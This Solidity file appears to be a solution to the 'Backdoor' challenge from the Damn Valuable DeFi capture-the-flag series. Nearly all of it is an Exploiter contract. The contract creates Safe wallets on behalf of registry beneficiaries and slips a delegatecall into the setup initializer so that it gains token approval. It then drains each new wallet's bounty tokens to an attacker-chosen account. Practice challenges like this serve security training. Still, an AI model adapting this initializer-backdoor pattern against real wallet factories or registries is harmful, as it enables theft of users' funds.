// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {OwnerManager} from "@safe-global/safe-smart-account/contracts/base/OwnerManager.sol";

contract Exploiter {
    address private immutable safeSingleton;
    address private immutable safeFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable token;
    address private immutable recoveryAccount;
    address[4] private beneficiaries;

    // grabbed from WalletRegistry contract
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10e18;

    // setting up
    constructor(
        address _safeSingleton,
        address _safeFactory,
        address _walletRegistry,
        address _tokenAddress,
        address _recoveryAccount,
        address[4] memory _beneficiaries
    ) {
        safeSingleton = _safeSingleton;
        safeFactory = _safeFactory;
        walletRegistry = _walletRegistry;
        token = DamnValuableToken(_tokenAddress);
        recoveryAccount = _recoveryAccount;
        beneficiaries = _beneficiaries;
    }

    /// called via delegatecall during Safe setup
    /// use: grants this contract approval to transfer tokens from the newly created Safe
    function approveBackdoor(address spender) external {
        token.approve(spender, PAYMENT_AMOUNT);
    }

    /// deploys Safe proxies on behalf of users and drains them
    function pwn() external {
        for (uint256 i = 0; i < 4; i++) {
            // prepare the owner list (each Safe has one owner: the target)
            address[] memory user = new address[](EXPECTED_OWNERS_COUNT); // "EXPECTED_OWNERS_COUNT" could be hardcoded as well but that's cleaner this way
            user[0] = beneficiaries[i];

            // build Safe::setup initializer payload with backdoor delegatecall
            bytes memory safeInitData = abi.encodeWithSelector(
                Safe.setup.selector,
                user, // _owners
                EXPECTED_THRESHOLD, // _threshold
                address(this), // to (this contract for delegatecall)
                abi.encodeWithSignature(
                    "approveBackdoor(address)",
                    address(this)
                ), // data (delegatecall payload)
                address(0), // fallbackHandler
                address(0), // paymentToken (ETH)
                0, // payment
                address(0) // paymentReceiver
            );

            // deploy the Safe via factory with the legit callback to qualify for bounty
            SafeProxy ourNewSafeProxy = SafeProxyFactory(safeFactory)
                .createProxyWithCallback(
                    safeSingleton,
                    safeInitData,
                    i,
                    IProxyCreationCallback(walletRegistry)
                );

            // drain tokens from the freshly deployed Safe to our given recovery account
            token.transferFrom(
                address(ourNewSafeProxy),
                recoveryAccount,
                PAYMENT_AMOUNT
            );
        }
    }
}
